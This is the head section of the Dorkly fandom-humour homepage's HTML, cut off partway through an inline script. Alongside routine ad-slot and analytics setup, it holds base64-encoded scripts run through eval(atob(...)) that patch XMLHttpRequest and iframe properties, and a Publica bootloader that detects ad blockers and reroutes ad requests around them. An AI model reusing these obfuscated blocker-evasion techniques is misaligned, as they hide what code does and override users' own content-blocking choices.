<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
        <!-- Adonis observer.min.js --><script>/* observer-7.0.2 */eval(atob("IWZ1bmN0aW9uIHQoZSxuLG8pe2Z1bmN0aW9uIHIoYSxzKXtpZighblthXSl7aWYoIWVbYV0pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFzJiZ1KXJldHVybiB1KGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIGQ9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IGQuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsZH12YXIgYz1uW2FdPXtleHBvcnRzOnt9fTtlW2FdWzBdLmNhbGwoYy5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBuPWVbYV1bMV1bdF07cmV0dXJuIHIobj9uOnQpfSxjLGMuZXhwb3J0cyx0LGUsbixvKX1yZXR1cm4gblthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxvLmxlbmd0aDthKyspcihvW2FdKTtyZXR1cm4gcn0oezE6W2Z1bmN0aW9uKHQsZSxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gbyh0KXt2YXIgZT0iTkVXX1NDUklQVF9FVkVOVCIsbj1uZXcgcihlLHtkZXRhaWw6e319KTt0LmRpc3BhdGNoRXZlbnQobil9dmFyIHI9dCgzKTtlLmV4cG9ydHM9b30sezM6M31dLDI6W2Z1bmN0aW9uKHQsZSxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gbyh0KXt0LmFkb25pcz10LmFkb25pc3x8e30sdC5hZG9uaXMuc2NyaXB0U3RhdHVzZXM9e30sdC5hZG9uaXMucmVxdWVzdFN0YXR1c2VzPXt9O3ZhciBlPXQuWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW47dC5YTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3Blbj1mdW5jdGlvbihuLG8pe3RoaXMuYWRkRXZlbnRMaXN0ZW5lcigiZXJyb3IiLGZ1bmN0aW9uKGUpezA9PT10aGlzLnN0YXR1cz90LmFkb25pcy5zY3JpcHRTdGF0dXNlc1tvXT0iZXJyb3IiOnQuYWRvbmlzLnNjcmlwdFN0YXR1c2VzW29dPSJsb2FkIn0pLHRoaXMuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsZnVuY3Rpb24oZSl7dC5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbb109ImxvYWQifSksdGhpcy5hZGRFdmVudExpc3RlbmVyKCJsb2FkZW5kIixmdW5jdGlvbihlKXt0LmFkb25pcy5yZXF1ZXN0U3RhdHVzZXNbb109dGhpcy5zdGF0dXMscih0KX0pO3ZhciBpPVtdLnNsaWNlLmNhbGwoYXJndW1lbnRzLDApO3JldHVybiBlLmFwcGx5KHRoaXMsaSl9fXZhciByPXQoMSk7ZS5leHBvcnRzPXt3cmFwWE1MSHR0cFJlcXVlc3Q6b319LHsxOjF9XSwzOltmdW5jdGlvbih0LGUsbil7KGZ1bmN0aW9uKHQpe2Z1bmN0aW9uIG4oKXt0cnl7dmFyIHQ9bmV3IG8oImNhdCIse2RldGFpbDp7Zm9vOiJiYXIifX0pO3JldHVybiJjYXQiPT09dC50eXBlJiYiYmFyIj09PXQuZGV0YWlsLmZvb31jYXRjaChlKXt9cmV0dXJuITF9dmFyIG89dC5DdXN0b21FdmVudDtlLmV4cG9ydHM9bigpP286InVuZGVmaW5lZCIhPXR5cGVvZiBkb2N1bWVudCYmImZ1bmN0aW9uIj09dHlwZW9mIGRvY3VtZW50LmNyZWF0ZUV2ZW50P2Z1bmN0aW9uKHQsZSl7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRXZlbnQoIkN1c3RvbUV2ZW50Iik7cmV0dXJuIGU/bi5pbml0Q3VzdG9tRXZlbnQodCxlLmJ1YmJsZXMsZS5jYW5jZWxhYmxlLGUuZGV0YWlsKTpuLmluaXRDdXN0b21FdmVudCh0LCExLCExLHZvaWQgMCksbn06ZnVuY3Rpb24odCxlKXt2YXIgbj1kb2N1bWVudC5jcmVhdGVFdmVudE9iamVjdCgpO3JldHVybiBuLnR5cGU9dCxlPyhuLmJ1YmJsZXM9Qm9vbGVhbihlLmJ1YmJsZXMpLG4uY2FuY2VsYWJsZT1Cb29sZWFuKGUuY2FuY2VsYWJsZSksbi5kZXRhaWw9ZS5kZXRhaWwpOihuLmJ1YmJsZXM9ITEsbi5jYW5jZWxhYmxlPSExLG4uZGV0YWlsPXZvaWQgMCksbn19KS5jYWxsKHRoaXMsInVuZGVmaW5lZCIhPXR5cGVvZiBnbG9iYWw/Z2xvYmFsOiJ1bmRlZmluZWQiIT10eXBlb2Ygc2VsZj9zZWxmOiJ1bmRlZmluZWQiIT10eXBlb2Ygd2luZG93P3dpbmRvdzp7fSl9LHt9XSw0OltmdW5jdGlvbih0LGUsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIG8odCxlLG4sbyl7ImFkZEV2ZW50TGlzdGVuZXIiaW4gdD90LmFkZEV2ZW50TGlzdGVuZXIoZSxuLG8pOiJhdHRhY2hFdmVudCJpbiB0JiZ0LmF0dGFjaEV2ZW50KCJvbiIrZSxuKX12YXIgcj10KDIpLGk9dCgxKTshZnVuY3Rpb24oKXt3aW5kb3cuYWRvbmlzPXdpbmRvdy5hZG9uaXN8fHt9LHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXM9e30sci53cmFwWE1MSHR0cFJlcXVlc3Qod2luZG93KSxvKGRvY3VtZW50LCJsb2FkIixmdW5jdGlvbih0KXt0LnRhcmdldCYmIlNDUklQVCI9PT10LnRhcmdldC5ub2RlTmFtZSYmKHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbdC50YXJnZXQuc3JjXT0ibG9hZCIsaSh3aW5kb3cpKX0sITApLG8oZG9jdW1lbnQsImVycm9yIixmdW5jdGlvbih0KXt0LnRhcmdldCYmIlNDUklQVCI9PT10LnRhcmdldC5ub2RlTmFtZSYmKHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbdC50YXJnZXQuc3JjXT0iZXJyb3IiLGkod2luZG93KSl9LCEwKX0oKX0sezE6MSwyOjJ9XX0se30sWzRdKTs="));</script>
        <link rel="shortcut icon" href="/favicon.ico">
	<link rel="canonical" href="http://www.dorkly.com">
    <meta property="og:locale" content="en_US">
	<meta property="og:site_name" content="Dorkly">
	<meta property="fb:app_id" content="541562735997202">
	<meta property="fb:pages" content="6363207806">
	<meta name="twitter:site" content="dorkly">
	<meta property="og:image" content="http://0.media.dorkly.cvcdn.com/98/37/3621b8cb181d80eb709a7a115575b6cd.png">
	<meta property="og:title" content="Dorkly - A Fun Take on Fandom">
	<meta property="og:description" content="">
	<meta property="og:type" content="website">
	<meta property="og:url" content="http://www.dorkly.com">
	<meta name="author" content="Dorkly Staff">
	<meta name="keywords" content="articles, funny articles, college articles, college stories, humor articles, essays, writing, rants, humour articles, satire, weekly wyr, stupid questions, hall of fame, jokes">
	<meta name="description" content="">
    <title>Dorkly - A Fun Take on Fandom</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href='http://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
    <link rel="apple-touch-icon" href="http://0.static.dorkly.cvcdn.com/images/touch/touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="http://1.static.dorkly.cvcdn.com/images/touch/touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="http://0.static.dorkly.cvcdn.com/images/touch/touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="http://1.static.dorkly.cvcdn.com/images/touch/touch-icon-152x152.png">
            <meta name="robots" content="index, follow, noodp, noydir">
        
                                <link rel="stylesheet" type="text/css" href="http://0.static.dorkly.cvcdn.com/css/packages/1f1b02743f3b65590832b031f75ebd29.css">
    <noscript><link rel="stylesheet" type="text/css" href="http://1.static.dorkly.cvcdn.com/jument/css/noscript.css"></noscript>
        <script type="text/javascript" src="http://1.static.dorkly.cvcdn.com/js/packages/a3047766f589750afbf2e8140b564531.js"></script>
                            <script src="https://www.googletagservices.com/tag/js/gpt.js"></script>
        <script src="//cdn.adsafeprotected.com/iasPET.1.js"></script>
        <!-- GPT and IAS -->
<script>
	var adslots = [];
	var googletag = googletag || {};
	googletag.cmd = googletag.cmd || [];
		var adUnitPath = '/8422/dorkly.com/homepage';

	function requestAds() {
			googletag.cmd.push(function() {

			var ad_dynamic_header_size_mapping = googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[2,2]).build();
			adslots['ad-dynamic-header'] = googletag.defineSlot("/8422/dorkly.com/homepage", [[2,2]], "ad-dynamic-header").setTargeting("position","ad_dynamic_header").defineSizeMapping(ad_dynamic_header_size_mapping).addService(googletag.pubads());


			var ad_outstream_size_mapping = googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[5,5]).build();
			adslots['ad-outstream'] = googletag.defineSlot("/8422/dorkly.com/homepage", [[5,5]], "ad-outstream").setTargeting("position","ad_outstream").defineSizeMapping(ad_outstream_size_mapping).addService(googletag.pubads());


			adslots['4x4-100x30'] = googletag.defineSlot("/8422/dorkly.com/homepage", [[4,4],[100,30]], "ad-nav-tab").addService(googletag.pubads());


			var ad_footer_size_mapping = googletag.sizeMapping().addSize([300,0],[[300,50],[320,50]]).addSize([992,0],[]).build();
			adslots['ad-adhesive-footer'] = googletag.defineSlot("/8422/dorkly.com/homepage", [[300,50],[320,50]], "ad-adhesive-footer").setTargeting("position","ad_adhesive_footer").defineSizeMapping(ad_footer_size_mapping).addService(googletag.pubads());


		});

		googletag.cmd.push(function() {		
		googletag.pubads().setTargeting("rating", "unrated");
		googletag.pubads().setTargeting("request_uri", "/");
		googletag.pubads().setTargeting("referrer", jument.analytics.referer());
		googletag.pubads().setTargeting("requestSource", "GPT");
		googletag.pubads().disableInitialLoad();
		googletag.pubads().enableSingleRequest();
		googletag.enableServices();
		});

	}

	// Set up IAS pet.js
	var iasDataHandler, iasDataHandlerNonPOE, __iasPET = __iasPET || {};
	__iasPET.queue = __iasPET.queue || [];
	__iasPET.pubId = '926604';

	var IASPET_TIMEOUT = 2000;
	var __iasPETTimeoutRequestAds = setTimeout(requestAds, IASPET_TIMEOUT);

	var iasDataHandler = function(adSlotData) {
		clearTimeout(__iasPETTimeoutRequestAds);
		__iasPET.setTargetingForGPT();
		requestAds();
	};
	// IAS Data Handler for Non POE ads without requestAds function call
	var iasDataHandlerNonPOE = function(adSlotData) {
		clearTimeout(__iasPETTimeoutRequestAds);
		__iasPET.setTargetingForGPT();
	};

	__iasPET.queue.push({
		adSlots: [
			
			{adSlotId: 'ad-dynamic-header', size: [[300,50],[300,250],[320,50],[728,90],[768,50],[768,250],[970,66],[970,90],[970,250]], adUnitPath: '/8422/dorkly.com/homepage'},
			{adSlotId: 'ad-outstream', size: [[5,5]], adUnitPath: '/8422/dorkly.com/homepage'},
			{adSlotId: 'ad-nav-tab', size: [[100,30]], adUnitPath: '/8422/dorkly.com/homepage'}  
		],
		dataHandler: iasDataHandler
	});
</script>
<!-- End: GPT and IAS -->        <!-- Amazon A9 - APS Transparent Tag Marketplace -->
<script type='text/javascript'>
	!function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function()
	{q("f",arguments)},setDisplayBids:function(){},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(
	A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");
	// initialize apstag and have apstag set bids on the googletag slots when they are returned to the page
	apstag.init({
		pubID: '3436',
		adServer: 'googletag',
		bidTimeout: 2e3
		});
	// request the bids for the googletag slots
	apstag.fetchBids({ slots: [ 
			{slotID:'ad-below-navigation',sizes:[[300, 250]]} 
		]}, function(bids) {
		console.log('apstag bids fetched! \n');
		console.dir(bids);
		// trigger the request to DFP
		googletag.cmd.push(function() {
		apstag.setDisplayBids();
		googletag.pubads().refresh();
		});
	});
</script>
<!-- End: Amazon A9 - APS Transparent Tag Marketplace -->        <!--[if lt IE 9]>
        <link rel="stylesheet" href="/jument/css/ie8-and-below.css">
        <script src="http://0.static.dorkly.cvcdn.com/jument/js/lib.html5shiv.js"></script>
        <script src="http://1.static.dorkly.cvcdn.com/jument/js/lib.respond.min.js"></script>
    <![endif]-->
    <!-- Package Link Data JSON (ld+json) -->
    <script type='application/ld+json'>{"@context":"http://schema.org","@type":"Webpage","headline":"Dorkly - A Fun Take on Fandom","thumbnailUrl":"http://0.media.dorkly.cvcdn.com/98/37/3621b8cb181d80eb709a7a115575b6cd.png","image":{"@type":"ImageObject","url":"http://0.media.dorkly.cvcdn.com/98/37/3621b8cb181d80eb709a7a115575b6cd.png","width":false,"height":false},"publisher":"","dateCreated":"","datePublished":"","dateModified":"","creator":"","author":"","keywords":["tag - articles","tag - funny articles","tag - college articles","tag - college stories","tag - humor articles","tag - essays","tag - writing","tag - rants","tag - humour articles","tag - satire","tag - weekly wyr","tag - stupid questions","tag - hall of fame","tag - jokes"],"url":"http://www.dorkly.com","mainEntityOfPage":"http://www.dorkly.com"}</script>    <!-- Publica (Recover your video advertising inventory) - DORKLY -->
    <script type="text/javascript">(function(g,v,w,p,U,H,m,I){function x(){return~~(100*Math.random())-~~(100*Math.random())}function y(a){var b;b=btoa(""+(new Date).getTime()).replace(/=/g,"").split("").sort(x).join("");var c=~~(Math.random()*(b.length-4))+2;b=b.substr(0,c)+"\x3d"+b.substr(c+1);return-1===a.indexOf("?")?a+"?"+b:a+"\x26"+b}function V(a,b){if(!a)return[];for(var c=[],d=0;d<a.length;d+=1){var e=a[d];"img"===(e.tagName||"").toLowerCase()?e.src&&("naturalHeight"in e?0<e.naturalHeight&&c.push(e.src):c.push(e.src)):"source"===(e.tagName||"").toLowerCase()&&e.srcset&&e.srcset.split(",").a(function(b){(b=b.trim().split(" ")[0].trim())&&c.push(b)})}return c.sort(x).concat(b)}function J(a,b,c,d){if(b>a.length-1)d();else{var e=new Image;e.onload=function(){c(a[b])};e.onerror=function(){J(a,b+1,c,d)};e.src=y(a[b])}}function z(a,b,c,d,e,f){var k=new Image;k.onload=function(){var k=a,g=b,h=c,m=d,n=e+1,l=f;l>=K?h(n,l):n+l===A?g(n,l):z(k,g,h,m+1,n,l)};k.onerror=function(){var k=a,g=b,h=c,m=d,n=e,l=f+1;l>=K?h(n,l):n+l===A?g(n,l):z(k,g,h,m+1,n,l)};k.src=y(a)}function X(a,b){J(a,0,function(a){z(a,function(a,c){b(!1,Y,a,c)},function(a,c){b(!0,Z,a,c)},0,0,0)},function(){b(!0,aa,-1,-1)})}function ba(a,b){var c=new XMLHttpRequest;c.open("GET",a,!0);c.onreadystatechange=function(){if(4===c.readyState){var a;a:{try{var e=JSON.parse(c.responseText);a=Array.isArray(e)?e:e.data||[];break a}catch(k){}a=[]}if(!a||0===a.length)return b(Error("Failed to check API status"),!1);for(var e=!0,f=0;f<a.length;f+=1)e=e&&!!a[f].healthy;return b(null,e)}};c.send()}function ca(a){var b=a.document.createElement("iframe");b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.top="-100px";b.style.left="-100px";a.document.body.appendChild(b);return b}function da(a,b){var c=a.document.createElement("div");c.setAttribute("class",ea);c.setAttribute("style",fa);a.document.body.appendChild(c);var d=0,e=setInterval(function(){try{var f;a:{var k=a;if(null!==k.document.body.getAttribute("abp")||null===c.offsetParent||0===c.offsetHeight||0===c.offsetLeft||0===c.offsetTop||0===c.offsetWidth||0===c.clientHeight||0===c.clientWidth)f=!0;else{if(void 0!==k.getComputedStyle){var g=k.getComputedStyle(c);if(g&&("none"===g.getPropertyValue("display")||"hidden"===g.getPropertyValue("visibility"))){f=!0;break a}}f=!1}}f?(clearInterval(e),b(null,!0)):(d+=1,d>=ga&&(clearInterval(e),b(null,!1)))}catch(W){clearInterval(e),b(W,!1)}},50)}function L(a,b,c,d){void 0===c&&(c=0);var e=a.document.createElement("script");e.onload=function(){d(!1)};e.onerror=function(){2<=c?d(!0):L(a,b,c+1,d)};e.async=!0;e.src=y(b);a.document.body.appendChild(e)}function ha(a,b){var c=["//d1zatounuylvwg.cloudfront.net/abw.js","//pagead2.googlesyndication.com/pagead/show_ads.js","//s0.2mdn.net/instream/video/client.js"],d=0,e=!1;c.forEach(function(f){try{L(a,f,0,function(a){d+=1;!e&&a&&(e=!0,b(null,!0));e||d!==c.length||(e=!0,b(null,!1))})}catch(k){d+=1,e||d!==c.length||(e=!0,b(k,!1))}})}function ia(a,b){function c(a,c){!f&&c?(f=!0,b(null,c)):(e+=1,2===e&&(f||(f=!0,b(a,c)),d.parentElement.removeChild(d)))}var d=ca(a),e=0,f=!1;ha(d.contentWindow,c);da(d.contentWindow,c)}function ja(){for(var a=64,b=[],c=0;1024>c;c++)b[c]=Math.floor(Math.random()*a);return b}function B(a,b){b=b?ka:la;a=g.btoa(a).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");for(var c="",d=0;d<a.length;d++)var e=b[d%4],f=a.charAt(d),f=C.indexOf(f),c=c+C.charAt((f+e)%64);for(d=0;4>d;d++)c+=C.charAt(b[d]);return c}function M(a){for(var b=~~((new Date).getTime()/36E5),c=[],d=0;1024>d;d+=1)c.push((b+d)%a);return c}function ma(a,b){("onLine"in navigator?navigator.onLine:1)?ba(p+N(g.location.href,"/"+B("h\x3d"+I+"\x26_\x3d"+~~((new Date).getTime()/36E5),!0)),function(c,d){c?h(O,c.message):d?ia(g,function(c,d){c?h(P,na,a,b):d?h(Q,q+" blocked",a,b):h(P,oa,a,b)}):h(O,pa)}):h(r,t)}function h(a,b,c,d){a={code:a,message:b,block_detection:{num_requests:0}};a.code===Q&&(a.site_disabled=!0);0<c&&(a.block_detection.success=c,a.block_detection.num_requests+=c);0<d&&(a.block_detection.fail=d,a.block_detection.num_requests+=d);D("error",a)}function D(a,b,c,d){d||(d=U);var e=g.location.href;b.bid_request={id:"-1",site:{page:e}};b.publisher_uuid=H;b.site_uuid=m;b.js_app_cdn_url=q;b.bootstrap_version=w;d+="/v1/log/";try{d+=a+"?"+B(JSON.stringify(b))}catch(f){d+="exception?e\x3d"+encodeURIComponent(f.message)+"\x26u\x3d"+encodeURIComponent(e)+"\x26bv\x3d"+w+"\x26p\x3d"+H+"\x26s\x3d"+m}e=new Image;c||(e.onerror=function(){D(a,b,1,p)});e.src=d;-1<"".indexOf("1")&&console.error(a,b)}function E(a,b){try{Object.defineProperty(g||{},a,{value:b,writable:!1,configurable:!1,enumerable:!1})}catch(c){}return g[a]}function R(a){var b=v.querySelectorAll("img,picture source");F=V(b,qa);0===F.length?a<ra?setTimeout(function(){R(a+1)},sa):h(r,t):X(F,function(a,b,e,f){a?h(r,t,e,f):G(e,f)})}function G(a,b){var c=v.createElement("script");c.async=!0;0===a+b?c.onerror=function(){("onLine"in navigator?navigator.onLine:1)?R(0):h(r,t)}:a+b===A?c.onerror=function(){G(a,b+1)}:(q=p+"/"+m+".js"+(""?"?"+"":""),c.onerror=function(){ma(a,b)});c.src=q;var d=v.querySelector("script");d.parentNode.insertBefore(c,d)}if("http:"===g.location.protocol||"https:"===g.location.protocol){var K=2,A=5,Y="network was successful",Z="error network is flaky",aa="error network is down",ea="pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links",fa="width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;",ga=5;M(32);var C="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",la=ja(),ka=M(64),N=0||function(a,b){return b},q=p+N(g.location.href,"/"+B("j\x3d"+I+"\x26_\x3d"+~~((new Date).getTime()/36E5),!0))+(""?"?"+"":""),sa=100,ra=20,t="network down",r="FLAKY_CONNECTION",Q="BLOCKED_BY_ADBLOCK",O="SERVER_DOWN",pa="SERVER may be partially down",P="ADBLOCK_MISS",na="Adblock detection errored out",oa="Adblock miss",u=m+"-cmd",F,qa="apple.com facebook.com linkedin.com google.com microsoft.com adblockplus.org".split(" ").sort(x);E(m+"-bs",w);var S=[];E(u,S);var u=E("pAPI",function(a,b){S.push([a,b])}),T=[];u.handlers=T;u.ready=function(a){T.push(a)};D("event",{type:"BOOTLOADER_LOADED"});G(0,0)}})(window,document,"ea909ecea4b6a28b1611b68a15193340ae5b5854","//d158nafix8anfs.cloudfront.net","https://168logger.com","4bf94b84-4353-4ca6-a3e9-6b35428e919f","3c0ca026-f9a5-4da5-985f-d0e4f7afa680","189");</script>
    <!-- End: Publica - DORKLY -->   
</head>
<body class="www dorkly notouch listing homepage">
<!-- Adonis wrapper.min.js --><script>/* wrapper-7.0.2 */eval(atob("IWZ1bmN0aW9uIHQobixlLHIpe2Z1bmN0aW9uIG8oYSxzKXtpZighZVthXSl7aWYoIW5bYV0pe3ZhciBjPSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFzJiZjKXJldHVybiBjKGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIGQ9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IGQuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsZH12YXIgdT1lW2FdPXtleHBvcnRzOnt9fTtuW2FdWzBdLmNhbGwodS5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBlPW5bYV1bMV1bdF07cmV0dXJuIG8oZT9lOnQpfSx1LHUuZXhwb3J0cyx0LG4sZSxyKX1yZXR1cm4gZVthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxyLmxlbmd0aDthKyspbyhyW2FdKTtyZXR1cm4gb30oezE6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7IWZ1bmN0aW9uKCl7ZnVuY3Rpb24gbigpe2kmJmNvbnNvbGUubG9nLmFwcGx5KGNvbnNvbGUsYXJndW1lbnRzKX1mdW5jdGlvbiBlKHQsbixyLG8saSxhLHMsYyxkLHUpe3ZhciBmPWZ1bmN0aW9uKCl7dD09PSEwJiZjb25zb2xlLmxvZy5hcHBseShjb25zb2xlLGFyZ3VtZW50cyl9LGw9Wyc8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+KCcsZS50b1N0cmluZygpLCIpKCIsW3QudG9TdHJpbmcoKSxuLnRvU3RyaW5nKCksci50b1N0cmluZygpLG8udG9TdHJpbmcoKSxpLnRvU3RyaW5nKCksYS50b1N0cmluZygpLHMudG9TdHJpbmcoKSxjLnRvU3RyaW5nKCksZC50b1N0cmluZygpLHUudG9TdHJpbmcoKV0uam9pbigiLCIpLnRvU3RyaW5nKCksIik8IiwiL3NjcmlwdD4iXS5qb2luKCIiKTtuKCkoSFRNTElGcmFtZUVsZW1lbnQsIm5hbWUiLHIoKSxvKGwpKSxuKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnREb2N1bWVudCIscyhhKGwpLGkoKSksYygpKSxuKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnRXaW5kb3ciLGQoYShsKSxpKCkpLHUoKSksd2luZG93LmZhaWxlZF91cmxzPXdpbmRvdy5mYWlsZWRfdXJsc3x8W107dmFyIHA9WyJzY3JpcHQiLCJpbWciXTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJsb2FkIixmdW5jdGlvbih0KXtmKCJ3aXRoaW5JZnJhbWUgbG9hZCBldmVudCIsdC50YXJnZXQpLCF0LnRhcmdldHx8IlNDUklQVCIhPT10LnRhcmdldC5ub2RlTmFtZSYmIklNRyIhPT10LnRhcmdldC5ub2RlTmFtZXx8KHQudGFyZ2V0Ll9sb2FkU3RhdGU9ImxvYWQiKX0sITApLGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImVycm9yIixmdW5jdGlvbih0KXtmKCJ3aXRoaW5JZnJhbWUgZXJyb3IgZXZlbnQiLHQudGFyZ2V0KSwhdC50YXJnZXR8fCJTQ1JJUFQiIT09dC50YXJnZXQubm9kZU5hbWUmJiJJTUciIT09dC50YXJnZXQubm9kZU5hbWV8fCh0LnRhcmdldC5fbG9hZFN0YXRlPSJlcnJvciIsd2luZG93LmZhaWxlZF91cmxzPXdpbmRvdy5mYWlsZWRfdXJsc3x8W10sd2luZG93LmZhaWxlZF91cmxzLnB1c2godC50YXJnZXQuc3JjKSl9LCEwKSx3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsZnVuY3Rpb24odCl7dmFyIG49dC5kYXRhLmV2ZW50TmFtZTtpZih2b2lkIDAhPT1uKXN3aXRjaChuKXtjYXNlImZyYW1lTG9hZGVkIjp3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHQuZGF0YSwiKiIpO2JyZWFrO2Nhc2UiYnViYmxldXAiOndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UodC5kYXRhLCIqIil9aWYodm9pZCAwIT09dC5kYXRhLmlmcmFtZUlkKXtmKCJtZXNzYWdlIHJlY2VpdmVkICIrdC5kYXRhLmlmcmFtZUlkKTt2YXIgZT10LmRhdGEscj1mdW5jdGlvbih0KXsibG9hZGluZyIhPT1kb2N1bWVudC5yZWFkeVN0YXRlP3QoKTpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIix0KX0sbz1mdW5jdGlvbiBpKHQpe3ZhciBuPXtvcmlnaW5JZnJhbWVJZDp0LmlmcmFtZUlkLHJlYWR5U3RhdGU6ZG9jdW1lbnQucmVhZHlTdGF0ZSxyZXF1ZXN0RGF0YTpbXSxjc3NEYXRhOltdfSxlPXQuc3JjU3Vic3RyaW5ncztpZih2b2lkIDAhPT1lKWZvcih2YXIgcj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKHAuam9pbigiLCIpKSxvPTA7bzxyLmxlbmd0aDtvKyspe3ZhciBhPXJbb107aWYoYS5zcmMpe3ZhciBzPWUuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gYS5zcmMuaW5kZXhPZih0KSE9PS0xfSk7aWYocyl7aWYodm9pZCAwPT09YS5fbG9hZFN0YXRlKXJldHVybiBmKCJXYWl0IGZvciBldmVudCBmcm9tICIrYS5zcmMpLGEuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsZnVuY3Rpb24oKXtpKHQpfSksdm9pZCBhLmFkZEV2ZW50TGlzdGVuZXIoImVycm9yIixmdW5jdGlvbigpe2kodCl9KTtuLnJlcXVlc3REYXRhLnB1c2goe3R5cGU6YS5ub2RlTmFtZSxzcmM6YS5zcmMsc3RhdGU6YS5fbG9hZFN0YXRlfSl9fX12YXIgYz10LmRpc3BsYXlUeXBlcyxkPXQuY3NzQXR0cmlidXRlczt2b2lkIDAhPT1jJiZ2b2lkIDAhPT1kJiYocj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKGMuam9pbigiLCIpKSxBcnJheS5wcm90b3R5cGUuZm9yRWFjaC5jYWxsKHIsZnVuY3Rpb24odCl7dmFyIGU9d2luZG93LmdldENvbXB1dGVkU3R5bGUodCkscj17fTtkLmZvckVhY2goZnVuY3Rpb24odCl7clt0XT1lLmdldFByb3BlcnR5VmFsdWUodCl9KSxuLmNzc0RhdGEucHVzaCh7dHlwZTp0Lm5vZGVOYW1lLGlkOnQuaWQsImNsYXNzIjp0LmdldEF0dHJpYnV0ZSgiY2xhc3MiKSxjc3NBdHRyaWJ1dGVzOnJ9KX0pKSxmKCJzZW5kIHJlc3BvbnNlICIrdC5pZnJhbWVJZCksbi5mYWlsZWRfdXJscz13aW5kb3cuZmFpbGVkX3VybHMscGFyZW50LnBvc3RNZXNzYWdlKG4sIioiKX07cihmdW5jdGlvbigpe28oZSl9KX19KX12YXIgcj10KDUpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LlJUQ1BlZXJDb25uZWN0aW9ufHx3aW5kb3cubW96UlRDUGVlckNvbm5lY3Rpb258fHdpbmRvdy53ZWJraXRSVENQZWVyQ29ubmVjdGlvbjtpZighbylyZXR1cm4gdm9pZCByLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaWZ3LnJ0Yy5hYnNlbnQiKTtyLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaWZ3LnJ0Yy5leGlzdHMiKTt2YXIgaT13aW5kb3cuYWRvbmlzSGFzaC5pbmRleE9mKCJhZG9uaXMtbG9nZ2luZyIpIT09LTEsYT1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSxyKXt2YXIgbz1PYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKHQucHJvdG90eXBlLG4pO09iamVjdC5kZWZpbmVQcm9wZXJ0eSh0LnByb3RvdHlwZSxuLHtnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gZShvLmdldCx0aGlzLGFyZ3VtZW50cyl9LHNldDpmdW5jdGlvbigpe3JldHVybiByKG8uc2V0LHRoaXMsYXJ